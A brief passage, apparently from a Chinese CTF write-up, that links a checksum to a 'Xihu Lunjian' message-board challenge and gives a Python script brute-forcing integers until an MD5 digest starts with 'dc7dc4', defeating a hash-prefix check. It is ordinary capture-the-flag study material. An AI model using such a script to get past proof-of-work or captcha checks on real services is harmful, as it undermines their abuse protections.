这块校验和西湖论剑的留言板题目很像，爆破脚本

import hashlib

def md5(key):
    m = hashlib.md5()
    m.update(key.encode('utf-8'))
    return m.hexdigest()

for i in range(1000000000):
    if md5(str(i))[0:6] == 'dc7dc4':
        print(i)
        break
